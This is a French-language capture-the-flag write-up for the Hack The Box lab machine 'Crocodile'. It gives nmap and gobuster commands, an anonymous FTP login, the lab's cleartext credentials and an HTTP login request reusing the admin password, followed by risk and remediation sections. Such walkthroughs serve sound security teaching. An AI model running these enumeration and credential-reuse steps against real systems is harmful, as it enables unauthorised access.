# HTB — Crocodile Write-up

- **Machine :** Crocodile
- **Plateforme :** Hack The Box
- **OS :** Linux
- **Difficulté :** Very Easy

---

## Description

Crocodile est une machine Linux très facile basée sur l'enchaînement de plusieurs mauvaises configurations : un accès **FTP anonyme**, des fichiers sensibles accessibles depuis ce FTP contenant des **identifiants stockés en clair**, et une **page de connexion cachée** sur le serveur web où ces identifiants peuvent être réutilisés pour accéder à l'administration. Ce *workflow* concerne à la fois la gestion des accès au service FTP (authentification anonyme non désactivée) et le contrôle d'accès à l'interface d'administration web.

---

## Exploitation

### 1. Reconnaissance

```bash
nmap -sC -sV -p- 10.129.5.192
```

Services importants identifiés :

- **FTP** → port 21
- **HTTP** → port 80

### 2. Connexion au FTP en anonyme

```bash
ftp 10.129.5.192
```

```
Name: anonymous
230 Login successful.
```

Le serveur FTP accepte une authentification anonyme.

### 3. Énumération des fichiers FTP

```bash
ls
```

Deux fichiers découverts :

```
allowed.userlist
allowed.userlist.passwd
```

Téléchargement :

```bash
get allowed.userlist
get allowed.userlist.passwd
bye
```

### 4. Lecture des fichiers récupérés

```bash
cat allowed.userlist
cat allowed.userlist.passwd
```

Liste des utilisateurs :

```
aron
pwnmeow
egotisticalsw
admin
```

Liste des mots de passe (correspondance ligne à ligne) :

```
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

Association :

```
aron             → root
pwnmeow          → Supersecretpassword1
egotisticalsw    → @BaASD&9032123sADS
admin            → rKXM59ESxesUFHAd
```

Les identifiants sont accessibles **en clair** depuis un FTP auquel n'importe qui peut se connecter anonymement.

### 5. Énumération du site web

```bash
gobuster dir -u http://10.129.5.192 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

### 6. Découverte de la page de connexion

Résultats intéressants :

```
/dashboard     (Status: 301)
/login.php     (Status: 200)
/logout.php    (Status: 302)
```

```
http://10.129.5.192/login.php
```

### 7. Réutilisation des identifiants

Connexion avec le compte `admin` :

```
Utilisateur : admin
Mot de passe : rKXM59ESxesUFHAd
```

La connexion fonctionne et donne accès à l'administration.

---

## PoC

**Connexion FTP anonyme et récupération des fichiers :**

```bash
ftp 10.129.5.192
# Name: anonymous
# 230 Login successful.
get allowed.userlist
get allowed.userlist.passwd
```

**Réutilisation des identifiants sur l'interface web :**

```http
POST /login.php HTTP/1.1
Host: 10.129.5.192
Content-Type: application/x-www-form-urlencoded

username=admin&password=rKXM59ESxesUFHAd
```

---

## Risk

- **Authentification FTP anonyme activée** : n'importe qui peut se connecter au service FTP sans identifiants et parcourir/télécharger les fichiers exposés.
- **Identifiants stockés et transmis en clair** : les fichiers `allowed.userlist` / `allowed.userlist.passwd` exposent en texte brut la correspondance utilisateur/mot de passe pour plusieurs comptes, dont `admin`.
- **Réutilisation de mots de passe entre services** : les identifiants trouvés sur le FTP sont valides sur l'interface web d'administration, transformant une fuite FTP en compromission complète de l'administration.
- **Page d'administration découvrable** : `/login.php` n'est pas référencée depuis la page principale mais reste accessible sans contrôle supplémentaire (pas de restriction IP, pas de MFA).
- **Impact global** : accès complet à l'interface d'administration de l'application avec le compte `admin`, ouvrant la porte à une compromission plus large (modification de contenu, accès à des données sensibles, pivot supplémentaire).

---

## Remediation

- Désactiver l'authentification anonyme sur le serveur FTP, ou restreindre son usage à des ressources publiques non sensibles uniquement.
- Ne jamais stocker d'identifiants en clair dans des fichiers accessibles, même via un service supposé restreint ; utiliser un stockage de secrets dédié (vault, gestionnaire de secrets) avec hachage/chiffrement.
- Interdire la réutilisation d'un même mot de passe entre plusieurs services (FTP, applications web, etc.).
- Protéger les interfaces d'administration par des contrôles supplémentaires : authentification forte (MFA), restriction d'accès par IP/VPN, et ne pas se reposer sur la simple absence de lien visible ("security through obscurity") comme mesure de protection.
- Auditer régulièrement les services exposés (FTP, HTTP) pour détecter les configurations par défaut ou les accès anonymes non désactivés.

---

## Résumé

**Machine :** Crocodile
**Vulnérabilité principale :** FTP anonyme exposant des identifiants en clair + réutilisation de mots de passe sur l'interface d'administration web
**Accès initial :** Connexion `admin` sur `/login.php` avec les identifiants récupérés via FTP
**Privilèges obtenus :** Accès administration web (compte `admin`)
